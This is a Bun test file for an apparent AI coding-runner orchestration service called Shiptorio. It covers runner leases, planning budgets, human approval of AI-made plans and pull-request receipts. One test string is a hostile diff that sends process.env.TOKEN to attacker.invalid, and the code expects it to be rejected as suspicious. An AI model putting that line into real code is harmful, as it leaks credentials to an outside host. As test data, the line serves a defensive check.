import { budgetDb } from "./budget-fixture";
import { BudgetError } from "../src/budget";
import { credentialEnv } from "./credential-fixture";
import { authorizedDB, membershipCache, authorizedSocket, browserEnv, browserCookies } from "./browser-fixture";
import { describe, expect, it, mock } from "bun:test";
import { FactoryState, type Item } from "@shiptorio/shared";
import { starterLine } from "../src/engine";
import { freshInspection, setStage, stageOf } from "../src/gauntlet";
import { normalizeGitHub } from "../src/sources/github";

// Exercise the real Factory transitions with storage and transport substitutes.
// Wrangler smoke checks below exercise workerd separately.
mock.module("cloudflare:workers", () => ({ DurableObject: class {
  ctx: unknown; env: unknown;
  constructor(ctx: unknown, env: unknown) { this.ctx = ctx; this.env = env; }
} }));
const { Factory } = await import("../src/factory");

function fixture(items: Item[] = [], extraEnv: Record<string, unknown> = {}) {
  const state = FactoryState.parse({ repo: "r3dbars/demo", baseBranch: "main", districts: [], ...starterLine(), items, science: { red: 0, green: 0, grey: 0, blue: 0 }, trust: 0.5, tick: 0 });
  const data = new Map<string, unknown>([["state", structuredClone(state)], ["meta", { repo: state.repo, installationId: 1 }]]);
  let alarm: number | null = null;
  const events: unknown[] = [];
  const storage = {
    async get(key: string) { return structuredClone(data.get(key)); },
    async put(key: string, value: unknown) { data.set(key, structuredClone(value)); },
    async delete(key: string) { return data.delete(key); },
    async list(options: { prefix: string; limit?: number }) { return new Map([...data.entries()].filter(([key]) => key.startsWith(options.prefix)).slice(0, options.limit)); },
    async transaction<T>(fn: (tx: { get(key: string): Promise<unknown>; put(key: string, value: unknown): Promise<void> }) => Promise<T>): Promise<T> { return fn(storage); },
    async getAlarm() { return alarm; },
    async setAlarm(value: number) { alarm = value; },
  };
  let exclusive: Promise<unknown> = Promise.resolve();
  const ctx = { storage, blockConcurrencyWhile: <T>(fn: () => Promise<T>) => { const next = exclusive.then(fn); exclusive = next.catch(() => {}); return next; }, getWebSockets: () => [authorizedSocket((raw: string) => events.push(JSON.parse(raw)))] };
  const spendDb = budgetDb().db;
  const env = { ...browserEnv, CACHE: membershipCache, DB: { prepare: (sql: string) => sql.includes("spark_factory_") ? spendDb.prepare(sql) : ({ bind: () => ({ first: async () => ({ user_id: 1, calls: 1, tokens: 100, next_at: Date.now(), failures: 0 }), run: async () => ({ success: true }), all: async () => ({ results: [] }) }) }) }, ...extraEnv };
  const factory = new Factory(ctx as never, credentialEnv({ ...env, DB: authorizedDB(env.DB), CACHE: membershipCache }) as never);
  return { factory, data, events, alarm: () => alarm, reload: () => new Factory(ctx as never, credentialEnv({ ...env, DB: authorizedDB(env.DB), CACHE: membershipCache }) as never), saved: () => data.get("state") as FactoryState };

}

const item = (overrides: Partial<Item> = {}): Item => ({ id: "gh-1", kind: "bug", source: "github_issue", title: "Fix checkout", district: "/", state: "on_pad", attempts: 1, prNumber: 42, updatedAt: Date.now(), ...overrides });

describe("Factory lifecycle", () => {
  it("broadcasts both provider plants from heartbeats before any claim, and marks logout offline", async () => {
    const f = fixture();
    const pair = await f.factory.pairRunner();
    await f.factory.heartbeatRunner(pair, ["codex", "claude_code"], []);
    expect(f.saved().power.filter(p => p.kind === "solar").map(p => p.name)).toEqual(["Codex", "Claude Code"]);
    expect(f.events.some((e: any) => e.type === "patch" && e.patch.power?.length)).toBe(true);
    await f.factory.heartbeatRunner(pair, ["claude_code"], ["codex"]);
    expect(f.saved().power.find(p => p.id === "solar-codex")?.online).toBe(false);
    expect(f.saved().power.find(p => p.id === "solar-claude_code")?.online).toBe(true);
  });

  it("publishes Codex/Claude sign-in cards on heartbeat, keeps them during builds, and clears them after reauth", async () => {
    const f = fixture([item({ state: "working" })], { SPARK_DISABLED: "1" });
    await f.factory.activateRunner("pair");
    for (const h of ["codex", "claude_code"] as const) {
      await f.factory.heartbeatRunner("pair", [], [h]);
      const card = f.saved().deck?.find(m => m.id === `runner-auth:${h}`);
      expect(card?.title).toContain(h === "codex" ? "Codex" : "Claude Code");
      expect(card?.why).toContain(`shiptorio-runner login ${h === "codex" ? "codex" : "claude"}`);
      await f.factory.heartbeatRunner("pair", [], [h]);
      expect(f.saved().deck?.filter(m => m.id === card!.id)).toHaveLength(1);
      const reloaded = f.reload();
      await reloaded.heartbeatRunner("pair", [h], []);
      expect(f.saved().deck?.some(m => m.id.startsWith("runner-auth:"))).toBe(false);
    }
    await expect(f.factory.heartbeatRunner("revoked", [], ["codex"])).rejects.toThrow("revoked");
  });

  it("broadcasts and persists exact player goals across Factory reloads, including clearing", async () => {
    const f = fixture();
    for (const goal of ["  Ship checkout fixes\nwithout regressions  ", "g".repeat(200), ""]) {
      f.events.length = 0;
      await f.factory.webSocketMessage(authorizedSocket(), JSON.stringify({ type: "set_goal", text: goal }));
      expect(f.events).toContainEqual(expect.objectContaining({ type: "patch", patch: { goal } }));
      expect(f.saved().goal).toBe(goal);
      // A fresh instance must read the durable value, not the previous instance's cache.
      const reloaded = f.reload() as unknown as { load(): Promise<FactoryState | null> };
      expect((await reloaded.load())?.goal).toBe(goal);
    }
  });
  it("rejects invalid or unauthorized goal messages without saving or broadcasting", async () => {
    const f = fixture();
    f.data.set("state", { ...f.saved(), goal: "Keep the existing goal" });
    await (f.factory as unknown as { load(): Promise<FactoryState | null> }).load();
    const before = structuredClone(f.saved());
    for (const raw of [
      "not JSON",
      JSON.stringify({ type: "set_goal" }),
      JSON.stringify({ type: "set_goal", text: null }),
      JSON.stringify({ type: "set_goal", text: 42 }),
      JSON.stringify({ type: "set_goal", text: "g".repeat(201) }),
      JSON.stringify({ type: "set_goal", text: "Valid goal", padding: " ".repeat(16384) }),
      new ArrayBuffer(8),
    ]) {
      await f.factory.webSocketMessage(authorizedSocket(), raw);
      expect(f.saved()).toEqual(before);
      expect(f.events).toEqual([]);
    }
    const unauthorized = authorizedSocket();
    unauthorized.serializeAttachment(null);
    const closed: unknown[][] = [];
    unauthorized.close = (...args) => { closed.push(args); };
    await f.factory.webSocketMessage(unauthorized, JSON.stringify({ type: "set_goal", text: "Unauthorized change" }));
    expect(closed).toEqual([[1008, "Sign in again"]]);
    expect(f.saved()).toEqual(before);
    expect(f.events).toEqual([]);
  });
  it("commits an exclusive runner lease while earlier browser authorization is held", async () => {
    const keys = await crypto.subtle.generateKey({ name: "RSASSA-PKCS1-v1_5", modulusLength: 2048, publicExponent: new Uint8Array([1, 0, 1]), hash: "SHA-256" }, true, ["sign", "verify"]);
    const pem = `-----BEGIN PRIVATE KEY-----\n${Buffer.from(await crypto.subtle.exportKey("pkcs8", keys.privateKey)).toString("base64")}\n-----END PRIVATE KEY-----`;
    const f = fixture([item({ state: "queued", prNumber: undefined, attempts: 0 })], { GITHUB_APP_ID: "1", GITHUB_APP_PRIVATE_KEY: pem, SPARK_DISABLED: "0" });
    const internal = f.factory as unknown as { env: { DB: { prepare(sql: string): any } }; broadcast(value: unknown): Promise<void> };
    await f.factory.exportState();
    await f.factory.activateRunner("pair");
    const id = crypto.randomUUID();
    f.data.set(`runnerJob:${id}`, { id, itemId: "gh-1", repo: "r3dbars/demo", harness: "codex", allowedPaths: ["src/a.ts"], plan: "Apply the approved fix", baseSha: "a".repeat(40), branch: `shiptorio/runner-${id}`, status: "ready", approvedAt: Date.now(), runAccount: "test-player" });
    const authStarted = Promise.withResolvers<void>(), releaseAuth = Promise.withResolvers<void>();
    const prepare = internal.env.DB.prepare.bind(internal.env.DB);
    let revoked = false, checks = 0;
    internal.env.DB.prepare = (sql: string) => {
      const statement = prepare(sql);
      if (!sql.startsWith("SELECT u.id, u.login FROM sessions")) return statement;
      return { ...statement, bind: (...args: unknown[]) => {
        const bound = statement.bind(...args);
        return { ...bound, first: async () => { checks++; authStarted.resolve(); await releaseAuth.promise; return revoked ? null : bound.first(); } };
      } };
    };
    const originalFetch = globalThis.fetch;
    globalThis.fetch = (async (url: unknown) => {
      if (String(url).endsWith("/access_tokens")) return Response.json({ token: "synthetic-installation-token" });
      throw Error("Unexpected provider request in held-auth regression");
    }) as typeof fetch;
    const queued = internal.broadcast({ type: "patch", patch: { tick: 9 } });
    await authStarted.promise;
    const claiming = Promise.all([f.factory.claimRunner("pair", ["codex"]), f.factory.claimRunner("pair", ["codex"])]);
    let timer: ReturnType<typeof setTimeout> | undefined;
    try {
      // The timeout is a failure bound, never a synchronization sleep: authorization
      // remains unresolved until after the real concurrent claims/heartbeat return.
      const claims = await Promise.race([
        claiming,
        new Promise<never>((_, reject) => { timer = setTimeout(() => reject(Error("Runner mutation waited on browser delivery")), 1000); }),
      ]);
      expect(claims.filter(Boolean)).toHaveLength(1);
      expect(claims.find(Boolean)).toMatchObject({ id, status: "running", pairId: "pair" });
      const running = f.data.get(`runnerJob:${id}`) as { lease: string; deadline: number };
      expect(running.lease).toMatch(/^[a-f0-9-]{36}$/);
      expect(running.deadline).toBeGreaterThan(Date.now());
      expect(f.saved().items[0]).toMatchObject({ state: "working", attempts: 1 });
      await f.factory.heartbeatRunner("pair", ["codex"]);
      expect((f.data.get("runnerPresence") as { harnesses: string[] }).harnesses).toEqual(["codex"]);
      expect(f.events).toEqual([]); // No frame bypasses its pending authorization.
      revoked = true;
    } finally {
      clearTimeout(timer);
      revoked = true;
      releaseAuth.resolve();
      await claiming.catch(() => {});
      await queued;
      await (f.factory as unknown as { broadcastQueue: Promise<void> }).broadcastQueue;
      globalThis.fetch = originalFetch;
    }
    expect(checks).toBeGreaterThan(1); // Each queued frame revalidates after revocation.
    expect(f.events).toEqual([]);
  });

  it("rejects expected planning limits without throwing through the object reset boundary", async () => {
    for (const scenario of ["capacity", "duplicate", "scope", "missing", "cooldown", "run-quota", "spark-budget", "budget-owner"] as const) {
      const f = fixture([item({ state: "queued", prNumber: undefined, attempts: 0 })], scenario === "spark-budget" ? { SPARK_DAILY_CALLS: "0" } : {});
      await f.factory.activateRunner("pair");
      const internal = f.factory as unknown as { ctx: { blockConcurrencyWhile<T>(fn: () => Promise<T>): Promise<T> }; usage(): Promise<unknown> };
      const atomic = internal.ctx.blockConcurrencyWhile.bind(internal.ctx);
      let resets = 0;
      internal.ctx.blockConcurrencyWhile = fn => atomic(async () => { try { return await fn(); } catch (error) { resets++; throw error; } });
      if (scenario === "capacity" || scenario === "duplicate") f.data.set("runnerJob:existing", { id: "existing", itemId: scenario === "capacity" ? "gh-2" : "gh-1", status: "awaiting_approval", harness: "codex", allowedPaths: [] });
      if (scenario === "cooldown") f.data.set("planningRetry:gh-1", { day: new Date().toISOString().slice(0, 10), failures: 3, retryAt: Date.now() + 60000, reason: "Failed planning" });
      if (scenario === "run-quota") {
        const database = (f.factory as unknown as { env: { DB: { prepare(sql: string): any } } }).env.DB;
        const prepare = database.prepare.bind(database);
        database.prepare = sql => sql.startsWith("SELECT runs_daily") ? { bind: () => ({ first: async () => ({ runs_daily: 0 }) }) } : prepare(sql);
      }
      if (scenario === "budget-owner") internal.usage = async () => { throw new BudgetError("Budget owner unavailable"); };
      const expected = { capacity: "Factory job budget reached", duplicate: "active runner job", scope: "Unsafe approved path", missing: "not available", cooldown: "Planning paused", "run-quota": "Daily run quota reached", "spark-budget": "daily call/token budget", "budget-owner": "Budget owner unavailable" }[scenario];
      const before = [...f.data.keys()].filter(key => key.startsWith("runnerJob:"));
      await expect(f.factory.enqueueRunner({ itemId: scenario === "missing" ? "gh-99" : "gh-1", harness: "codex", allowedPaths: scenario === "scope" ? [".github/workflows/escape.yml"] : ["src/a.ts"] })).rejects.toThrow(expected);
      expect(resets).toBe(0); // Cloudflare resets the DO if the callback throws.
      expect([...f.data.keys()].filter(key => key.startsWith("runnerJob:"))).toEqual(before);
      await f.factory.heartbeatRunner("pair", ["codex"]);
      expect((f.data.get("runnerPresence") as { harnesses: string[] }).harnesses).toEqual(["codex"]);
    }
  });

  it("keeps unexpected storage failures inside the reset boundary", async () => {
    const f = fixture([item({ state: "queued", prNumber: undefined, attempts: 0 })]);
    const internal = f.factory as unknown as { ctx: { blockConcurrencyWhile<T>(fn: () => Promise<T>): Promise<T>; storage: { list(): Promise<unknown> } } };
    const atomic = internal.ctx.blockConcurrencyWhile.bind(internal.ctx);
    let resets = 0;
    internal.ctx.blockConcurrencyWhile = fn => atomic(async () => { try { return await fn(); } catch (error) { resets++; throw error; } });
    internal.ctx.storage.list = async () => { throw Error("Synthetic storage failure"); };
    await expect(f.factory.enqueueRunner({ itemId: "gh-1", harness: "codex", allowedPaths: ["src/a.ts"] })).rejects.toThrow("Synthetic storage failure");
    expect(resets).toBe(1);
    expect([...f.data.keys()].filter(key => key.startsWith("runnerJob:"))).toEqual([]);
  });

  it("keeps concurrent planning admission exclusive while duplicate rejection does not reset", async () => {
    const f = fixture([item({ state: "queued", prNumber: undefined, attempts: 0 })]);
    const internal = f.factory as unknown as { ctx: { blockConcurrencyWhile<T>(fn: () => Promise<T>): Promise<T> } };
    const atomic = internal.ctx.blockConcurrencyWhile.bind(internal.ctx);
    let resets = 0;
    internal.ctx.blockConcurrencyWhile = fn => atomic(async () => { try { return await fn(); } catch (error) { resets++; throw error; } });
    const input = { itemId: "gh-1", harness: "codex" as const, allowedPaths: ["src/a.ts"] };
    const outcomes = await Promise.allSettled([f.factory.enqueueRunner(input), f.factory.enqueueRunner(input)]);
    expect(outcomes.filter(result => result.status === "fulfilled")).toHaveLength(1);
    expect(outcomes.filter(result => result.status === "rejected")).toHaveLength(1);
    expect([...f.data.keys()].filter(key => key.startsWith("runnerJob:"))).toHaveLength(1);
    expect(resets).toBe(0);
  });

  it("runs Spark planning, exclusive runner claim, scoped branch verification and idempotent PR receipts", async () => {
    const keys = await crypto.subtle.generateKey({ name: "RSASSA-PKCS1-v1_5", modulusLength: 2048, publicExponent: new Uint8Array([1, 0, 1]), hash: "SHA-256" }, true, ["sign", "verify"]);
    const der = await crypto.subtle.exportKey("pkcs8", keys.privateKey);
    const pem = `-----BEGIN PRIVATE KEY-----\n${Buffer.from(der).toString("base64")}\n-----END PRIVATE KEY-----`;
    const originalFetch = globalThis.fetch;
    const base = "a".repeat(40), head = "b".repeat(40);
    let receiptPatch: string | undefined = "-old\n-old2\n+fixed\n+test";
    let opened = 0, sparkCalls = 0, merged = false, browserPlanning = false, browserCall = 0;
    let onFeedbackRead: (() => Promise<void>) | undefined;
    globalThis.fetch = (async (input: string | URL | Request, init?: RequestInit) => {
      const url = String(input);
      if (/\/comments\?per_page=100&page=/.test(url) && !url.includes("/issues/1/comments?")) return Response.json([]);
      if (url.endsWith("/comments")) return Response.json({ id: 1 });
      const json = (value: unknown) => Response.json(value);
      if (url.endsWith("/access_tokens")) return json({ token: "fake-install-token" });
      if (url.endsWith("/chat/completions") && String(init?.body).includes("game master")) { const brief = JSON.parse(JSON.parse(JSON.parse(String(init?.body)).messages[1].content.split("\n")[1])); return json({ choices: [{ message: { content: JSON.stringify({ order: brief.cards.map((c: { id: string }) => c.id), reason: "Oldest jam first.", picks: {} }) } }] }); }
      if (url.endsWith("/chat/completions") && browserPlanning) {
        browserCall++;
        const action = browserCall === 1 ? { files: ["server/src/engine.ts", "shared/src/protocol.ts"] } : browserCall === 2 ? { tool: "read_issue", reason: "Understand issue" } : browserCall === 3 ? { tool: "read_file", path: "shared/src/protocol.ts", reason: "Read reference schema without editing it" } : { tool: "assign_job", files: ["server/src/engine.ts"], reason: "Ready for player review", plan: "Add direnv coverage to the existing guard.", acceptance: ["Reject .envrc"] };
        return json({ choices: [{ message: { content: JSON.stringify(action) } }] });
      }
      if (url.endsWith("/chat/completions")) { sparkCalls++; return json({ choices: [{ message: { content: JSON.stringify(sparkCalls === 1 ? { tool: "read_issue", reason: "Understand the approved issue" } : sparkCalls === 2 ? { tool: "read_file", path: "server/src/engine.ts", reason: "Inspect the existing guard" } : { tool: "assign_job", files: ["server/src/engine.ts"], reason: "The scope is clear", plan: "Reject credential paths and add a regression test.", acceptance: ["Ordinary code paths remain accepted", "Secret paths are refused"] }) } }] }); }
      if (url.includes("/contents/")) return json({ content: btoa("export const SAFE_PATH = /.+/;"), encoding: "base64" });
      if (url.endsWith("/repos/r3dbars/demo")) return json({ default_branch: "main" });
      if (url.includes("/git/trees/")) return json({ sha: "tree-is-not-commit", tree: [{ path: "server/src/engine.ts", type: "blob" }, { path: "shared/src/protocol.ts", type: "blob" }], truncated: false });
      if (url.endsWith("/git/ref/heads/main")) return json({ object: { sha: base } });
      if (url.includes("/git/ref/heads/shiptorio/")) return json({ object: { sha: head } });
      if (url.includes("/compare/")) return json({ status: "ahead", ahead_by: 1, files: [{ filename: "server/src/engine.ts", status: "modified", changes: 4, patch: receiptPatch }] });
      if (url.endsWith("/pulls/99")) return json({ head: { sha: head }, merged });
      if (url.includes("/pulls/99/files?")) return json([{ filename: "server/src/engine.ts", status: "modified", changes: 4, patch: receiptPatch }]);
      if (url.includes("/issues/1/comments?")) { const hook = onFeedbackRead; onFeedbackRead = undefined; await hook?.(); return json([]); }
      if (url.endsWith("/issues/1/comments") && init?.method === "POST") return json({ id: 200 });
      if (url.endsWith("/issues/1")) return json({ number: 1, title: "Fix checkout", body: merged ? "Issue was closed by merge" : "Canonical request", state: merged ? "closed" : "open", html_url: "https://github.com/r3dbars/demo/issues/1", user: { login: "reporter" } });
      if (url.includes("/check-runs?")) return json({ total_count: 1, check_runs: [{ name: "CI", status: "completed", conclusion: "success" }] });
      if (url.includes("/status?")) return json({ total_count: 0, statuses: [] });
      if (url.includes("/pulls?")) return json([]);
      if (url.endsWith("/pulls") && init?.method === "POST") { opened++; return json({ number: 99, html_url: "https://github.com/r3dbars/demo/pull/99" }); }
      throw new Error(`Unexpected test request ${url}`);
    }) as typeof fetch;
    try {
      const f = fixture([item({ state: "queued", prNumber: undefined, attempts: 0 })], { GITHUB_APP_ID: "1", GITHUB_APP_PRIVATE_KEY: pem, META_API_KEY: "fake-meta-key" });
      const pair = await f.factory.pairRunner();
      const job = await f.factory.enqueueRunner({ itemId: "gh-1", harness: "codex", allowedPaths: ["server/src/engine.ts"] });
      expect(job.status).toBe("planning");
      await expect(f.factory.enqueueRunner({ itemId: "gh-1", harness: "codex", allowedPaths: ["server/src/engine.ts"] })).rejects.toThrow("active runner job");
      await f.factory.alarm();
      expect((await f.factory.runnerJobs())[0].baseSha).toBe(base);
      expect((await f.factory.runnerJobs())[0].plan).toContain("regression test");
      expect(f.saved().brain?.thoughts.some(t => t.decision === "plan" && t.by === "spark")).toBe(true);
      await expect(f.factory.claimRunner("wrong-pair", ["codex"])).rejects.toThrow("revoked");
      expect(await f.factory.claimRunner(pair, [])).toBeNull();
      const claimed = await Promise.all([f.factory.claimRunner(pair, ["claude_code"]), f.factory.claimRunner(pair, ["claude_code"])]);
      expect(claimed.filter(Boolean)).toHaveLength(1);
      const assigned = claimed.find(Boolean)!;
      expect(assigned.token).toBe("fake-install-token");
      expect(assigned.harness).toBe("claude_code");
      expect(assigned.plan).toBe((await f.factory.runnerJobs())[0].plan);
      expect(f.saved().machines.find(m => m.id === "runner-claude_code")?.powerId).toBe("solar-claude_code");
      const realNow = Date.now;
      try {
        // A claim whose response was lost: the same idle runner asking again gets the same job back.
        Date.now = () => realNow() + 60_000;
        expect(await f.factory.claimRunner(pair, ["codex"])).toBeNull(); // never switch a running lease
        expect((await f.factory.claimRunner(pair, ["claude_code"]))?.lease).toBe(assigned.lease);
      } finally { Date.now = realNow; }
      expect(f.saved().items[0].state).toBe("working");
      expect(f.saved().deck?.some(m => m.options.some(o => o.actions.some(a => a.tool === "approve_runner_job")))).toBe(false);
      const receipt = { jobId: job.id, lease: assigned.lease!, ok: true, sha: head, summary: "Fixed with regression coverage", checks: ["typecheck", "test", "build"] as const };
      await expect(f.factory.finishRunner(pair, { ...receipt, checks: [] })).rejects.toThrow("check receipts");
      await expect(f.factory.finishRunner(pair, { ...receipt, sha: base, checks: [...receipt.checks] })).rejects.toThrow("head mismatch");
      const safePatch = receiptPatch;
      receiptPatch = undefined;
      await expect(f.factory.finishRunner(pair, { ...receipt, checks: [...receipt.checks] })).rejects.toThrow("complete patch");
      receiptPatch = "+fetch('https://attacker.invalid', { body: process.env.TOKEN });\n+test\n-old\n-old2";
      await expect(f.factory.finishRunner(pair, { ...receipt, checks: [...receipt.checks] })).rejects.toThrow("Suspicious diff");
      expect(opened).toBe(0);
      receiptPatch = safePatch;
      const result = await f.factory.finishRunner(pair, { ...receipt, checks: [...receipt.checks] });
      expect(result.prUrl).toEndWith("/99");
      await f.factory.onCheckSuite([], true, "unrelated", base);
      expect(f.saved().items[0].inspection?.stages[0].state).toBe("pending");
      await f.factory.onCheckSuite([], true, "current head without PR links", head);
      expect(f.saved().items[0].inspection?.stages[0].state).toBe("passed");
      await f.factory.finishRunner(pair, { ...receipt, checks: [...receipt.checks] });
      expect(opened).toBe(1);
      expect(sparkCalls).toBe(3);
      expect((await f.factory.runnerJobs())[0].steps?.map(s => s.tool)).toEqual(["read_issue", "read_file", "assign_job"]);
      expect(f.saved().items[0].state).toBe("inspecting");
      expect((await f.factory.runnerJobs())[0].lease).toBeUndefined();
      // Simulate the legacy close-before-merge deletion, then replay a real merged-PR receipt.
      (f.factory as unknown as { state: FactoryState }).state.items = [];
      merged = true;
      await f.factory.finishRunner(pair, { ...receipt, checks: [...receipt.checks] });
      await f.factory.finishRunner(pair, { ...receipt, checks: [...receipt.checks] });
      expect(f.saved().items[0].state).toBe("launched");
      expect(f.saved().science.red).toBe(1);
      expect(opened).toBe(1);
      await f.factory.pairRunner();
      await expect(f.factory.claimRunner(pair, ["codex"])).rejects.toThrow("revoked");

      merged = false;
      browserPlanning = true;
      const prepareBrowserPlan = async (backlog = false) => {
        browserCall = 0;
        const g = fixture([item({ state: "queued", prNumber: undefined, attempts: 0, body: "Canonical request\n\nLabels: \n\nComment: 🧠 **Shiptorio planned this** with Meta Muse Spark (`muse-spark-1.3`)\nOld speculative scope" }), ...(backlog ? [item({ id: "gh-2", title: "Another queued issue", state: "queued", prNumber: undefined, attempts: 0 })] : [])], { GITHUB_APP_ID: "1", GITHUB_APP_PRIVATE_KEY: pem, META_API_KEY: "fake-meta-key" });
        const pairing = await g.factory.pairRunner();
        expect(await g.factory.claimRunner(pairing, ["codex"])).toBeNull();
        // A backlog can rank either issue first when creation times tie; this fixture builds #1.
        const proposal = g.saved().deck!.find(move => move.itemId === "gh-1" && move.options.some(option => option.actions.some(action => action.tool === "plan_runner_job")))!;
        await g.factory.webSocketMessage(authorizedSocket(), JSON.stringify({ type: "choose_move", moveId: "forged", optionId: "codex" }));
        expect(await g.factory.runnerJobs()).toHaveLength(0);
        await g.factory.webSocketMessage(authorizedSocket(), JSON.stringify({ type: "choose_move", moveId: proposal.id, optionId: "codex" }));
        expect(await g.factory.claimRunner(pairing, ["codex"])).toBeNull();
        await g.factory.alarm();
        expect((await g.factory.runnerJobs())[0].status).toBe("awaiting_approval");
        expect(g.saved().items[0].body).toBe("Canonical request\n\nLabels: ");
        expect((await g.factory.runnerJobs())[0].allowedPaths).toEqual(["server/src/engine.ts"]);
        expect(g.saved().deck?.find(m => m.options.some(o => o.id === "approve"))?.plan?.[0]).toContain("server/src/engine.ts");
        expect(await g.factory.claimRunner(pairing, ["codex"])).toBeNull();
        return { g, pairing, approval: g.saved().deck!.find(m => m.options.some(o => o.id === "approve"))! };
      };
      const backlog = await prepareBrowserPlan(true);
      expect(backlog.g.saved().deck?.some(m => m.id === backlog.approval.id)).toBe(true);
      await backlog.g.factory.alarm();
      expect(backlog.g.saved().deck?.some(m => m.id === backlog.approval.id)).toBe(true);
      (backlog.g.factory as unknown as { state: FactoryState }).state.move = { id: "old-resource-card", title: "Connect", why: "legacy", stage: "resources", createdAt: 1, options: [{ id: "connect", label: "Connect", recommended: true, actions: [] }] };
      expect(await backlog.g.factory.claimRunner(backlog.pairing, ["codex"])).toBeNull();
      expect(backlog.g.saved().deck?.some(m => m.id === backlog.approval.id)).toBe(true);
      expect(backlog.g.saved().deck?.find(m => m.id === backlog.approval.id)?.options[0].id).toBe("approve");
      const approved = await prepareBrowserPlan();
      await approved.g.factory.enqueueGitHub("own-plan-audit", "issue_comment", { action: "created", repository: { full_name: "r3dbars/demo" }, installation: { id: 1 }, issue: { number: 1, title: "Fix checkout", body: "Canonical request", state: "open", html_url: "https://github.com/r3dbars/demo/issues/1" }, comment: { id: 200, body: "🧠 **Shiptorio planned this** with Meta Muse Spark (`muse-spark-1.3`)\nOld speculative scope", user: { login: "shiptorio[bot]", type: "Bot" } } });
      await approved.g.factory.alarm();
      expect((await approved.g.factory.runnerJobs())[0].status).toBe("awaiting_approval");
      expect(approved.g.saved().items[0].body).toBe("Canonical request\n\nLabels: ");
      const reconnected = approved.g.reload();
      const approve = JSON.stringify({ type: "choose_move", moveId: approved.approval.id, optionId: "approve" });
      await reconnected.webSocketMessage(authorizedSocket(), approve);
      await reconnected.webSocketMessage(authorizedSocket(), approve);
      expect((await reconnected.runnerJobs())[0].status).toBe("ready");
      expect((await reconnected.runnerJobs())[0].approvedAt).toBeGreaterThan(0);
      const doubleClaim = await Promise.all([reconnected.claimRunner(approved.pairing, ["codex"]), reconnected.claimRunner(approved.pairing, ["codex"])]);
      expect(doubleClaim.filter(Boolean)).toHaveLength(1);
      expect(doubleClaim.find(Boolean)!.allowedPaths).toEqual(["server/src/engine.ts"]);

      const declined = await prepareBrowserPlan();
      await declined.g.factory.webSocketMessage(authorizedSocket(), JSON.stringify({ type: "defer_move", moveId: declined.approval.id }));
      expect(await declined.g.factory.claimRunner(declined.pairing, ["codex"])).toBeNull();
      expect(declined.g.saved().deck?.some(m => m.id === declined.approval.id)).toBe(false);
      expect((await declined.g.factory.runnerJobs())[0].status).toBe("awaiting_approval"); // Later keeps the exact plan for the next check-in.

      const stale = await prepareBrowserPlan();
      for (const signal of normalizeGitHub({ repository: { full_name: "r3dbars/demo" }, issue: { number: 1, title: "Changed scope", body: "New request", html_url: "https://github.com/r3dbars/demo/issues/1", updated_at: "2026-10-26T19:00:00Z" } })) await stale.g.factory.ingestSignal(signal);
      await stale.g.factory.webSocketMessage(authorizedSocket(), JSON.stringify({ type: "choose_move", moveId: stale.approval.id, optionId: "approve" }));
      expect((await stale.g.factory.runnerJobs())[0].status).toBe("failed");
      expect(await stale.g.factory.claimRunner(stale.pairing, ["codex"])).toBeNull();

      const human = await prepareBrowserPlan();
      for (const signal of normalizeGitHub({ repository: { full_name: "r3dbars/demo" }, issue: { number: 1, title: "Fix checkout", body: "Canonical request", html_url: "https://github.com/r3dbars/demo/issues/1" }, comment: { id: 201, body: "A genuine new requirement", user: { login: "r3dbars", type: "User" } } })) await human.g.factory.ingestSignal(signal);
      await human.g.factory.webSocketMessage(authorizedSocket(), JSON.stringify({ type: "choose_move", moveId: human.approval.id, optionId: "approve" }));
      expect((await human.g.factory.runnerJobs())[0].status).toBe("failed");
      expect(await human.g.factory.claimRunner(human.pairing, ["codex"])).toBeNull();

      const raced = fixture([item({ state: "queued", prNumber: undefined, attempts: 0 })], { GITHUB_APP_ID: "1", GITHUB_APP_PRIVATE_KEY: pem, META_API_KEY: "fake-meta-key" });
      await raced.factory.enqueueRunner({ itemId: "gh-1", harness: "codex", allowedPaths: [], needsApproval: true });
      onFeedbackRead = async () => {
        for (const signal of normalizeGitHub({ repository: { full_name: "r3dbars/demo" }, issue: { number: 1, title: "Fix checkout", body: "Canonical request", html_url: "https://github.com/r3dbars/demo/issues/1" }, comment: { id: 202, body: "Human requirement arriving during refresh", user: { login: "r3dbars", type: "User" } } })) await raced.factory.ingestSignal(signal);
      };
      await raced.factory.alarm();
      expect((await raced.factory.runnerJobs())[0].status).toBe("failed");
      expect(raced.saved().items[0].body).toContain("Human requirement arriving during refresh");

      const closed = await prepareBrowserPlan();
      await closed.g.factory.enqueueGitHub("close-planned", "issues", { action: "closed", repository: { full_name: "r3dbars/demo" }, installation: { id: 1 }, issue: { number: 1, title: "Fix checkout", state: "closed", html_url: "https://github.com/r3dbars/demo/issues/1" } });
      await closed.g.factory.alarm();
      expect(closed.g.saved().items).toHaveLength(0);
      expect((await closed.g.factory.runnerJobs())[0].status).toBe("failed");
      expect(await closed.g.factory.claimRunner(closed.pairing, ["codex"])).toBeNull();
    } finally { globalThis.fetch = originalFetch; }
  }, 20000); // Multiple complete planning/recovery flows; allow loaded macOS hosts to finish mock cleanup.
  it("durably queues delivery work and folds it before acknowledgment", async () => {
    const f = fixture();
    const payload = { action: "opened", repository: { full_name: "r3dbars/demo" }, installation: { id: 1 }, issue: { number: 9, title: "Broken checkout", body: "Customer context", html_url: "https://github.com/r3dbars/demo/issues/9", user: { login: "example-user" }, updated_at: "2026-10-26T12:00:00Z" } };
    await f.factory.enqueueGitHub("fake-delivery-9", "issues", payload);
    await f.factory.enqueueGitHub("fake-delivery-9", "issues", payload);
    expect(f.data.has("delivery:fake-delivery-9")).toBe(true);
    expect(f.saved().items).toHaveLength(0);
    await f.factory.alarm();
    expect(f.data.has("delivery:fake-delivery-9")).toBe(false);
    expect(f.saved().items).toHaveLength(1);
    expect(f.saved().items[0].ore?.count).toBe(1);
    expect(f.saved().bottleneck?.stage).toBe("resources");
  });
  it("awards one rocket and one science pack for redelivered merge webhooks", async () => {
    const f = fixture([item()]);
    await f.factory.onPullClosed(42, true);
    await f.factory.onPullClosed(42, true);
    expect(f.saved().items[0].state).toBe("launched");
    expect(f.saved().science.red).toBe(1);
    expect(f.saved().trust).toBe(0.55);
  });
  it("keeps a tracked PR when its issue-close webhook arrives before the merge", async () => {
    const f = fixture([item({ state: "inspecting" })]);
    await f.factory.enqueueGitHub("close-before-merge", "issues", { action: "closed", repository: { full_name: "r3dbars/demo" }, installation: { id: 1 }, issue: { number: 1, title: "Fix checkout", state: "closed", html_url: "https://github.com/r3dbars/demo/issues/1" } });
    await f.factory.alarm();
    expect(f.saved().items).toHaveLength(1);
    await f.factory.onPullClosed(42, true);
